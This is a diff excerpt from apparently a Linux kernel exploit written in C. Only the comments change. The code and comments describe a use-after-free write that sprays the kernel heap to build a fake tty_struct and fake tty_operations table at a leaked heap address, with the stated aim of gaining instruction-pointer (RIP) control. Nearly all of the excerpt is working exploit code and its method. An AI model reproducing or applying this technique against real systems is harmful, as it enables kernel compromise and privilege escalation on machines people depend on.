@@ -245,20 +245,21 @@ int main() {
 
   /* [3-1] UAF Write: rewriting tty_struct */
 
-  // What happens next is particularly practical. The same buffer is used to
-  // spray tty_struct and tty_operations.  First, the buffer is going to be
-  // copied at address kheap in the first spray--which will replace the object
-  // deleted to leak kheap, which is now a tty_struct. What matters is the
-  // tty_operations ->ioctl member ends up at kheap+12.  The second spray will
-  // replace the victim allocated below with tty_struct and overwrite the
-  // tty_struct with this same data. This will be the tty_struct used to
-  // trigger the exploit. tty[3] (ops) will be pointing at kheap, where the
-  // first spray will have deployed the fake tty_operations that will give us
-  // RIP control.
+  // What does next is quite pragmatic. The same buffer is used to spray
+  // tty_struct and tty_operations.  First, the buffer is going to be copied at
+  // address kheap in the first spray--which will replace the object deleted to
+  // leak kheap, which is now a tty_struct. What matters is the tty_operations
+  // ->ioctl member ends up at kheap+12.  The second spray will replace the
+  // victim allocated below with tty_struct and overwrite the tty_struct with
+  // this same data. This will be the tty_struct used to trigger the exploit.
+  // tty[3] (ops) will be pointing at kheap, where the first spray will have
+  // deployed the fake tty_operations that will give us RIP control.
   memcpy(buf, page+0x1000, 0x400);
   // Prepare fake tty_struct and tty_operations
   unsigned long *tty = (unsigned long*)buf;
   tty[0] = 0x0000000100005401; // magic
+  // ->dev assigned below could as well be taken from page + 0x1000 + 0x10,
+  // which is already in place, and therefore no need for this assignment
   tty[2] = *(unsigned long*)(page + 0x10); // dev
   tty[3] = kheap; // ops
   // since ops is pointing at the same memory address (kheap) this fake
